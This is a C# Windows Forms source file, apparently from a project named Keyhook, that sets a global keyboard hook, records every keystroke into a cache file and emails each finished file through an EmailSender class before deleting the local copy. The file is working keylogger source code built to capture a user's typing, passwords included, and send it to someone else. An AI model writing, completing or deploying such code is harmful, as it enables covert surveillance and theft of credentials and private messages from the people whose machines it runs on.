using System.Globalization;
using System.Windows.Forms;
using Keyhook.Helpers;
using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;

namespace Keyhook
{
    public partial class Form1 : Form
    {
        private readonly FileManager _fileManager;
        readonly KeysConverter kc = new KeysConverter();
        public Form1()
        {
            TopMost = true;
            InitializeComponent();

            _fileManager = new FileManager();
            var mailSender = new EmailSender();

            _fileManager.ReadyFile += (sender, args) =>
            {
                mailSender.Send(args.FilePath);
                _fileManager.DeleteFile(args.FilePath);
                Result.Clear();
            };

            var mKeyboardHookManager = new KeyboardHookListener(new GlobalHooker()) { Enabled = true };
            mKeyboardHookManager.KeyDown += HookManager_KeyDown;
        }

        private void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            var isEnglish = LanguageManager.GetKeyboardLayout() == 1033;
            var data = isEnglish ? e.KeyData.ToString() : LanguageManager.GetCharsFromKeys(e.KeyCode, false, false);
            _fileManager.AddCache(data);
            Result.Text = _fileManager.CacheLength.ToString(CultureInfo.InvariantCulture) + " " + data + " ";
        }


    }
}
